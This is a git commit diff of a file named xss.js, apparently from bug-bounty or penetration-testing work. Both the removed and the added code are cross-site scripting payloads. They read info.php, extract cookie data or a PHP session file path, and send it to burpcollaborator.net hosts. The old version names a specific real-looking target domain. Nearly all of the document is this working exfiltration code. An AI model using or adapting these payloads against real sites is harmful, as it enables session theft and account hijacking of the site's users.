950a7d7a22f648440c357dfd5041fe9ea90589aa
shankar acharya <34772838+5hank4r@users.noreply.github.com>
2025-06-12 10:34:48 +0545

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,11 +1,12 @@
-fetch('https://tatacars.sipradi.com.np/info.php')
-  .then(response => response.text())
-  .then(text => {
-    let cookieMatch = text.match(/_COOKIE.{1,2000}/);
-    if (cookieMatch) {
-      fetch('http://aftpmh4i5w0rhzlsh7e5lkya91fr3g.burpcollaborator.net/?cookie=' + encodeURIComponent(cookieMatch[0]));
-    } else {
-      console.log("No _COOKIE match found");
+fetch('/info.php')
+  .then(res => res.text())
+  .then(html => {
+    const match = html.match(/\/tmp\/sess_[a-z0-9]+/i);
+    if (match) {
+      fetch('http://fgzunm5n611wi4mxicfampzfa6gy4n.burpcollaborator.net', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionFile: match[0], url: location.href })
+      });
     }
-  })
-  .catch(e => console.error("Fetch error:", e));
+  });
